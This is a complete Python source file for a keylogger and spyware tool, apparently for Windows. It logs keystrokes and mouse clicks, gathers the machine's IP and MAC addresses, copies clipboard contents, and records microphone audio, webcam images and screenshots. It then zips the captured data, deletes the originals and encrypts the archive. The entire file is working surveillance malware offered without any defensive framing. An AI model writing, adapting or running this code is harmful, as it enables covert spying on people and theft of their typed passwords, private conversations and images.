######################################## IMPORT STATEMENTS ########################################

import logging
import requests
import pyaudio
import win32clipboard
import time
import platform
import socket
import re
import uuid
import psutil
import os
import cv2
import pathlib
import sounddevice
import wavio
import zipfile
import shutil


from pynput import keyboard, mouse
from pynput.keyboard import Key
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
from PIL import ImageGrab
from multiprocessing import Process


######################################## CONSTANTS ########################################

SCREEN = 'Screenshots'
WEBCAM = 'WebcamPics'
LOG_FILE = "keylogfile.txt"
CLIPBOARD = "clipboard.txt"
WAVE_OUTPUT_FILENAME = "audiofolder"
ZIP = "test.zip"
CHUNK = 4096
FORMAT = pyaudio.paInt32
CHANNELS = 2
RATE = 48000

# Initialize PyAudio
audio = pyaudio.PyAudio()


######################################## LOGS ########################################

# Get system information
def get_system_info():
    info = {}
    try:
        response = requests.get('https://ipinfo.io/ip')
        info['Public IP Address'] = response.text.strip()
    except requests.RequestException as e:
        info['Public IP Address'] = f"Unable to get the Public IP Address: {str(e)}"
    
    info['System'] = f"{platform.system()} {platform.version()}"
    info['Architecture'] = platform.machine()
    info['Hostname'] = socket.gethostname()
    info['Private IP Address'] = socket.gethostbyname(socket.gethostname())
    info['MAC Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    info['Processor'] = platform.processor()
    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 ** 3)))} GB"

    return info

# Mouse click
def on_mouse_click(pressed, button, x,y):
    if pressed:
        logging.info(f"Mouse clicked at ({x}, {y}) with {button} button")


# Log system information
def log_system_info():
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
    info = get_system_info()

    for i, value in info.items():
        logging.info(f"{i}: {value}")
    logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")

    on_press = lambda key : logging.info(f"[Key Pressed] - {key}")
    with Listener(on_press=on_press) as listener, mouse.Listener(on_press=on_mouse_click) as mouseclick:
        listener.join()
        mouseclick.join()


# Audio Recording
def Audio():
    pathlib.Path(WAVE_OUTPUT_FILENAME).mkdir(parents=True, exist_ok=True)
    fs = 44100
    seconds = 30

    for x in range(10000):
        recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        output_filename = f'{WAVE_OUTPUT_FILENAME}/mic_recording_{x}.wav'
        wavio.write(output_filename, recording, fs, sampwidth=3)


# Capture images from webcam
def webcam():
    try:
        pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
        cam_path = 'WebcamPics/'
        cam = cv2.VideoCapture(0)
        for x in range(10000):
            ret, img = cam.read()
            file = (cam_path + f'{x}.jpg')
            cv2.imwrite(file, img)
            time.sleep(5)

        cam.release()
        cv2.destroyAllWindows()
    except Exception as e:
        print("WebcamPics could not be saved: " + str(e))


# Monitor clipboard
def clipboard():
    previous_clipboard_data = ""
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        if pasted_data != previous_clipboard_data:
            with open(CLIPBOARD, "a") as file:
                file.write("Clipboard Data : \n")
                file.write(str(pasted_data) + "\n")
                file.write("\n")
            previous_clipboard_data = pasted_data

            time.sleep(1)
    except Exception as e:
        with open(CLIPBOARD, "a") as file:
            file.write("\n Clipboard could not be copied: " + str(e) + "\n")


# Screenshot
def screenshot():
    try:
        pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
        screen_path = 'Screenshots/'

        for x in range(0, 10000):
            pic = ImageGrab.grab()
            pic.save(screen_path + f'screenshot{x}.png')
            time.sleep(5)
    except Exception as e:
        print("Screenshots could not be saved: " + str(e))


# Function to create a ZIP file with specified files and folders
def zip_folders(files_and_folders, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for item in files_and_folders:
            if os.path.isdir(item):
                for root, _, files in os.walk(item):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, item)
                        zipf.write(file_path, os.path.join(os.path.relpath(root, item), arcname))
            else:
                arcname = os.path.basename(item)
                zipf.write(item, arcname)



# Function to encrypt the created ZIP file
def encrypt_zip(zip_file_path):
    with open('keyfile.key', 'rb') as keyfile:
        key = keyfile.read()

    fernet = Fernet(key)

    with open(zip_file_path, 'rb') as unencrypted_zip:
        zip_data = unencrypted_zip.read()

    encrypted_zip_data = fernet.encrypt(zip_data)

    with open(zip_file_path, 'wb') as encrypted_zip:
        encrypted_zip.write(encrypted_zip_data)



# Delete the files and folders
def delete(files_and_folders):
    for item in files_and_folders:
            try:
                if os.path.isdir(item):
                    shutil.rmtree(item)
                else:
                    os.remove(item)
            except Exception as e:
                print(f"Failed to delete {item}: {e}")


def main():
    try:
        # Create a list of processes for each task
        processes = []
        processes.append(Process(target=log_system_info))
        processes.append(Process(target=clipboard))
        processes.append(Process(target=webcam))
        processes.append(Process(target=Audio))
        processes.append(Process(target=screenshot))
        
        # Start the processes
        for process in processes:
            process.start()

        # Wait for 20 seconds
        time.sleep(20)
        
        # Terminate the processes
        for process in processes:
            process.terminate()
        
        # Wait for processes to finish
        for process in processes:
            process.join()
        
        # Specify files and folders to include in the ZIP
        files_and_folders = [LOG_FILE, CLIPBOARD, SCREEN, WEBCAM, WAVE_OUTPUT_FILENAME]
        
        # Create a ZIP file with the specified files and folders
        zip_folders(files_and_folders, ZIP)

        delete(files_and_folders)
        
        # Encrypt the created ZIP file
        encrypt_zip(ZIP)
     
    except Exception as e:
        print(f"An error occurred: {str(e)}")


if __name__ == '__main__':
    try:
        if os.path.exists("keyfile.key"):
            main()
        else:
            print("I think you forgot to generate the key.")

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, filename='error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass
